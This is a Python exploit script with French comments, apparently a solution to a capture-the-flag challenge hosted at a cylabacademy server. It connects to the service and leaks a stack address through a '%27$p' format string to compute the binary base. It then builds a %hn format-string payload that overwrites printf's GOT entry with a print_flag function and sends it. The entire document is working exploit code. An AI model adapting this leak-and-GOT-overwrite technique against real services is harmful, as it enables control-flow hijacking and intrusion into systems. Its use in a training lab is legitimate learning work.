import sys, socket, time, re, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "xebec.cylabacademy.net", 28899
PF_OFF = 0x1269
GOT_OFF = 0x3fa0

s = socket.create_connection((HOST, PORT), timeout=15)
s.settimeout(6)
time.sleep(0.6)
try:
    s.recv(4096)
except Exception:
    pass
# 1. leak de main (position 27)
s.sendall(b"%27$p\n")
time.sleep(0.5)
data = s.recv(8192).decode("utf-8", "replace")
print("leak output:", data[:200])
m = re.search(r"0x([0-9a-f]+)", data)
if not m:
    print("pas de leak"); sys.exit(1)
leak = int(m.group(1), 16)
base = leak - 0x1401
# verifier : l'adresse se termine par 1401
if (leak & 0xFFF) != 0x401:
    print("attention, leak inattendu:", hex(leak))
print("leak:", hex(leak), "base:", hex(base))
pf = base + PF_OFF
got = base + GOT_OFF
print("print_flag:", hex(pf), "got printf:", hex(got))

low = pf & 0xFFFF
mid = (pf >> 16) & 0xFFFF
high = (pf >> 32) & 0xFFFF
targets = [(got, low), (got + 4, high), (got + 2, mid)]
targets.sort(key=lambda t: t[1])
# construire les specs
spec = ""
prev = 0
for i, (addr, val) in enumerate(targets):
    delta = (val - prev) & 0xFFFF
    spec += f"%{delta}c" if delta else ""
    spec += f"%{11 + i}$hn"
    prev = val
print("spec (%d):" % len(spec), spec)
pad = (-len(spec)) % 8
payload = spec.encode() + b"P" * pad
for addr, val in targets:
    payload += struct.pack("<Q", addr)
print("payload len:", len(payload))
print("payload:", payload)
if len(payload) > 99:
    print("trop long")
    sys.exit(1)
s.sendall(payload + b"\n")
time.sleep(1.0)
out = ""
try:
    while True:
        chunk = s.recv(8192)
        if not chunk:
            break
        out += chunk.decode("utf-8", "replace")
except Exception:
    pass
print("=== SORTIE ===")
print(out[:800])
s.close()
